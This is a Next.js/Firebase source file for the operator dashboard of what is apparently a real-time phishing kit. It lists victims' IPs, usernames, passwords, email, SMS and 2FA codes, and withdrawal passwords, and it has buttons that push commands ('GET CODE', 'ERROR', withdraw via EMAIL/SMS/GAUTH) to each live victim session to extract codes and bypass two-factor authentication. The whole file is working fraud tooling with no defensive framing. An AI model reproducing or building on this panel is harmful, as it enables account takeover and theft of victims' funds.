"use client";

import { database } from "@/firebase";
import { onValue, ref, update, remove } from "firebase/database";
import Image from "next/image";
import { useEffect, useRef, useState } from "react";

interface IInfo {
  [key: string]: {
    online: true;
    username: string;
    password: string;
    emailCode: string;
    twoAF: string;
    smsCode: string;
    trPass: {
      tr: string;
      email: string;
      sms: string;
      twoFa: string;
    };
    ip: string;
    zone: string;
    command: string;
  };
}

export default function PanelPage() {
  const [dataInfos, setDataInfos] = useState<IInfo>({});
  const [audio, setAudio] = useState<any>(null);
  const [dataInfoString, setDtInfo] = useState("");

  const prevCountRef = useRef<IInfo>({});
  useEffect(() => {
    const infosRef = ref(database, "info");
    onValue(infosRef, (snap) => {
      const dataSet: IInfo = {};
      const data = snap.val();
      if (data) {
        const ips = Object.keys(data);
        ips.forEach((key) => {
          if (data[key]) {
            Object.keys(data[key]).forEach((c) => {
              const valueRow = data[key][c];
              dataSet[c] = valueRow;
            });
          }
        });
        prevCountRef.current = dataSet;
        setDtInfo(JSON.stringify(dataSet));
      } else {
        setDataInfos({});
        setDtInfo("");
        prevCountRef.current = {};
      }
    });

    setAudio(new Audio("/notf.mp3"));
  }, []);

  useEffect(() => {
    if (
      Object.keys(dataInfos).length < Object.keys(prevCountRef.current).length
    ) {
      audio.play();
    }

    if (dataInfos !== prevCountRef.current) {
      setDataInfos((prev) => {
        return { ...prevCountRef.current };
      });
    }
  }, [dataInfoString]);

  const handleCommand = (cmd: string, ip: string, id: string) => {
    const infoRef = ref(database, `info/${ip}/${id}`);

    update(infoRef, { command: cmd });
  };

  return (
    <>
      <main className="flex flex-col w-full h-[100vh] py-16 bg-zinc-800 text-zinc-200">
        <div className="flex flex-row w-full pb-24 px-10">
          <div className="flex flex-col gap-4 w-full rounded-xl">
            <div className="flex flex-col w-48 items-center justify-center">
              <button
                onClick={() => {
                  const infoRef = ref(database, `info`);
                  remove(infoRef);
                  setDataInfos({});
                  setDtInfo("");
                }}
                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
              >
                CLEAR DATA
              </button>
            </div>
            <table className="w-full text-sm text-left rtl:text-right text-gray-500 rounded-2xl shadow">
              <thead className="text-xs text-white uppercase bg-zinc-600 rounded-2xl">
                <tr className="rounded-3xl">
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    #
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    Username
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    Password
                  </th>
                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    EmailCode
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    2AF
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    SmsCode
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-medium text-zinc-400 text-center"
                  >
                    WITHDRAW
                  </th>

                  <th
                    scope="col"
                    className="px-6 py-3 text-base font-bold text-zinc-200 text-center"
                  >
                    STATUS
                  </th>
                </tr>
              </thead>
              <tbody className="rounded-3xl">
                {Object.keys(dataInfos)
                  .reverse()
                  .map((key, idx) => {
                    const data = dataInfos[key];
                    const id = key;
                    if (!data.ip) return <></>;
                    const ip = data.ip.replaceAll(".", ",");
                    return (
                      <tr
                        key={key}
                        className={`${
                          !data.online ? "bg-zinc-700" : "bg-zinc-500"
                        }`}
                      >
                        <td className="px-6 py-4 font-medium text-base items-center text-white text-center flex flex-row gap-2">
                          <Image
                            src={`https://flagsapi.com/${data.zone}/flat/64.png`}
                            width={28}
                            height={28}
                            alt="Flag"
                          />
                          - {data.ip}
                        </td>
                        <td className="px-6 py-4 font-medium text-base text-white text-center text-wrap">
                          {data.username !== "" ? (
                            <SpanValueText text={data.username} />
                          ) : (
                            "N/A"
                          )}
                        </td>
                        <td className="px-6 py-4 font-medium text-base text-white text-center">
                          {data.password !== "" ? (
                            <SpanValueText text={data.password} />
                          ) : (
                            "N/A"
                          )}
                        </td>
                        <td className="px-6 py-4 font-medium text-base text-white text-center">
                          {data.emailCode !== "" ? (
                            <SpanValueText text={data.emailCode} />
                          ) : data.command.includes("CONFIRM") ? (
                            <div className="flex w-full justify-center  items-center">
                              <button
                                onClick={() => handleCommand("W_SEC_2", ip, id)}
                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                              >
                                GET CODE
                              </button>
                            </div>
                          ) : (
                            "N/A"
                          )}
                        </td>

                        <td className="px-6 py-4 font-medium text-base text-white text-center items-center">
                          {data.twoAF !== "" ? (
                            <SpanValueText text={data.twoAF} />
                          ) : data.command.includes("CONFIRM") ? (
                            <div className="flex w-full justify-center  items-center">
                              <button
                                onClick={() => handleCommand("W_SEC_1", ip, id)}
                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                              >
                                GET CODE
                              </button>
                            </div>
                          ) : (
                            "N/A"
                          )}
                        </td>

                        <td className="px-6 py-4 font-medium text-base text-white text-center">
                          {data.smsCode !== "" ? (
                            <SpanValueText text={data.smsCode} />
                          ) : data.command.includes("CONFIRM") ? (
                            <div className="flex w-full justify-center  items-center">
                              <button
                                onClick={() => handleCommand("W_SEC_3", ip, id)}
                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                              >
                                GET CODE
                              </button>
                            </div>
                          ) : (
                            "N/A"
                          )}
                        </td>

                        <td className="px-6 py-4 font-medium text-base text-white text-center">
                          <p>
                            email:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.email} />
                            </strong>
                          </p>
                          <p>
                            sms:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.sms} />
                            </strong>
                          </p>
                          <p>
                            gAuth:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.twoFa} />
                            </strong>
                          </p>
                        </td>
                        {/* <td className="px-3 py-4 font-medium text-sm flex flex-col gap-1 text-white text-center">
                          <p>
                            email:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.email} />
                            </strong>
                          </p>
                          <p>
                            sms:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.sms} />
                            </strong>
                          </p>
                          <p>
                            gAuth:{" "}
                            <strong>
                              <SpanValueText text={data.trPass.twoFa} />
                            </strong>
                          </p>
                        </td> */}
                        <td className="px-6 py-4 flex flex-row gap-2 font-medium text-base text-white text-center">
                          {data.command === "W_LOGIN_CONFIRM" ? (
                            <>
                              <button
                                onClick={() =>
                                  handleCommand("W_LOGIN_ERROR", ip, id)
                                }
                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                              >
                                ERROR
                              </button>
                            </>
                          ) : data.command.includes("W_SEC") &&
                            data.command.includes("CONFIRM") ? (
                            <>
                              <button
                                onClick={() => {
                                  const ref = data.command.split("_")[2];
                                  const code = `W_SEC_${ref}_ERROR`;
                                  handleCommand(code, ip, id);
                                }}
                                className="flex bg-zinc-400 py-2 px-4 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                              >
                                ERROR
                              </button>
                            </>
                          ) : null}
                          {data.command.includes("CONFIRM") ? (
                            <>
                              <div className="w-full justify-center text-center grid grid-cols-2 gap-2  items-center">
                                <button
                                  onClick={() =>
                                    handleCommand("W_WITH_2", ip, key)
                                  }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  EMAIL
                                </button>

                                <button
                                  onClick={() =>
                                    handleCommand("W_WITH_3", ip, key)
                                  }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  SMS
                                </button>

                                <button
                                  onClick={() =>
                                    handleCommand("W_WITH_3", ip, key)
                                  }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  GAUTH
                                </button>

                                <button
                                  // onClick={() =>
                                  //   handleCommand("W_WITH_23", key)
                                  // }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  EMAIL + SMS
                                </button>

                                <button
                                  // onClick={() =>
                                  //   handleCommand("W_WITH_13", key)
                                  // }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  SMS + 2FA
                                </button>
                                <button
                                  // onClick={() =>
                                  //   handleCommand("W_WITH_12", key)
                                  // }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  EMAIL + 2FA
                                </button>

                                <button
                                  // onClick={() =>
                                  //   handleCommand("W_WITH_123", key)
                                  // }
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  AMBOS
                                </button>
                                <button
                                  // onClick={() => {
                                  //   if (data.command.includes("CONFIRM")) {
                                  //     handleCommand(
                                  //       data.command.replace(
                                  //         "CONFIRM",
                                  //         "ERROR"
                                  //       ),
                                  //       key
                                  //     );
                                  //   } else {
                                  //     handleCommand("W_SEC_ERROR_", key);
                                  //   }
                                  // }}
                                  className="flex bg-zinc-400 py-2 pl-1 rounded-lg text-zinc-800 transition-all hover:bg-zinc-200 font-semibold text-base"
                                >
                                  ERROR
                                </button>
                              </div>
                            </>
                          ) : null}
                        </td>
                      </tr>
                    );
                  })}
              </tbody>
            </table>
          </div>
        </div>
      </main>
    </>
  );
}

const SpanValueText = ({ text }: any) => {
  return (
    <>
      <span
        onClick={() => {
          navigator.clipboard.writeText(text);
        }}
        className="text-base font-bold text-zinc-300 cursor-pointer"
      >
        {text}
      </span>
    </>
  );
};
